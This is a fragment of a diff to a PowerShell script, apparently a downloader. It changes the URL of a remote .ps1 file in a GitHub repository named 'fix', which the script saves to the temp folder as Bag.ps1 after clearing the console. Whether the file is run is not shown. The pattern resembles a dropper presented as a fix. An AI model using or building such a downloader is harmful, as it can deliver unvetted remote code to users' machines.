@@ -4,7 +4,7 @@ $Host.UI.RawUI.BackgroundColor = "Black"
 Clear-Host
 
 # === ORIGINAL DOWNLOADER - UNTOUCHED ===
-$url = "https://github.com/yamos11/fix/raw/refs/heads/main/ps.ps1"
+$url = "https://github.com/yamos11/fix/raw/refs/heads/main/script.ps1"
 $path = "$env:TEMP\Bag.ps1"
 try {
     Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -ErrorAction Stop
